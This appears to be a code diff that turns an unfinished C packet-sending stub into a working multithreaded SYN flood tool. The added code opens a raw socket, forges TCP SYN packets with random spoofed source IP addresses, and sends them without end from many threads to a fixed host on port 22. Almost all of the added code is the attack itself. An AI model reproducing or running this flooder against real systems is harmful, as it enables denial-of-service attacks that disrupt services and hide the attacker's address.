@@ -1,48 +1,79 @@
-#include <stdio.h> 
+#include "transfer.h"
 
-#include <pcap.h>
-#include <netinet/if_ether.h>
-#include <netinet/ip.h>
 
-typdef struct ether_header ETH_HEADER;
-typedef struct ip IP_HEADER;
+void *thread_handler(void *arg){
+    const char *server_ip = "10.42.0.185";
+    uint16_t port = 22;
 
+    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if(sd == -1){
+        perror("socket error");
+        exit(EXIT_FAILURE);
+    }
+
+    // packets
+    IP_Header_t *iphead = (IP_Header_t *) malloc(sizeof(IP_Header_t));
+    TCP_Header_t *tcphead = (TCP_Header_t *) malloc(sizeof(TCP_Header_t));
+
+    // convert ip from string to binary
+    struct sockaddr_in dest_addr;
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_port = htons(port);
+    if(inet_pton(AF_INET, server_ip, &dest_addr.sin_addr) <= 0){
+        perror("inet_pton error");
+        exit(EXIT_FAILURE);
+    }
+    
+    size_t syn_len = sizeof(IP_Header_t) + sizeof(TCP_Header_t);
+
+    fill_SYN(iphead, tcphead, dest_addr.sin_addr.s_addr, dest_addr.sin_port);
+
+    // initialize rng
+    srand(*((uint32_t*) arg));
+
+    while(1){
+        // get random number
+        uint32_t randnum = rand();
+
+        // randomize source address
+        IP_set_src_address(iphead, get_random_src_address(randnum));
+
+        // update checksums
+        IP_update_checksum(iphead);
+        TCP_update_checksum(tcphead, iphead);
+
+        // serialize
+        byte *ip_stream = serialize_ip_header(iphead);
+        byte *tcp_stream = serialize_tcp_header(tcphead);
+        //      combined serialized segments to form serialized packet
+        byte *syn = form_packet(ip_stream, tcp_stream);
+
+        // send packet
+        if(sendto(sd, syn, syn_len, 0, (struct sockaddr *) &dest_addr, sizeof(struct sockaddr_in)) < 0){
+            perror("sendto error");
+            exit(EXIT_FAILURE);
+        }else{
+            printf("Sent successfully\n");
+        }
+        sleep(1);
+    }
+
+    close(sd);
+    return NULL;
+}
 
 int main() {
-    pcap_t *handle;
-    struct pcap_pkthdr header;
-    const u_char *packet;
-    struct ether_header *eth_header;
-    u_char *frame;
-    int frame_size;
+    pthread_t ptid;
+    srand(time(NULL));
+    uint32_t randnum;
 
-    // Allocate memory for the frame
-    frame_size = sizeof(struct ether_header) + sizeof(struct ip);
-    frame = (u_char *)malloc(frame_size);
-    if (frame == NULL) {
-        fprintf(stderr, "Memory allocation failed\n");
-        return 1;
+    for(int i = 0; i < IO_LIMIT; i++){
+        randnum = rand();
+        int pt = pthread_create(&ptid, NULL, thread_handler, (void *) &randnum);
+        if(pt != 0){
+            perror("pthread error");
+        }
     }
-
-    // Set Ethernet header fields
-    eth_header = (struct ether_header *)frame;
-    memset(eth_header->ether_dhost, 0xff, ETHER_ADDR_LEN); // Destination MAC address (broadcast)
-    memset(eth_header->ether_shost, 0x00, ETHER_ADDR_LEN); // Source MAC address
-    eth_header->ether_type = htons(ETHERTYPE_IP); // EtherType (IPv4)
-
-    // Set IP header fields
-    struct ip *ip_header = (struct ip *)(frame + sizeof(struct ether_header));
-    // Set other IP header fields as needed
-
-    // Send the frame
-    if (pcap_sendpacket(handle, frame, frame_size) != 0) {
-        fprintf(stderr, "Packet sending failed\n");
-        return 1;
-    }
-
-    // Clean up
-    free(frame);
-    pcap_close(handle);
-
+    pthread_exit(NULL);
     return 0;
 }
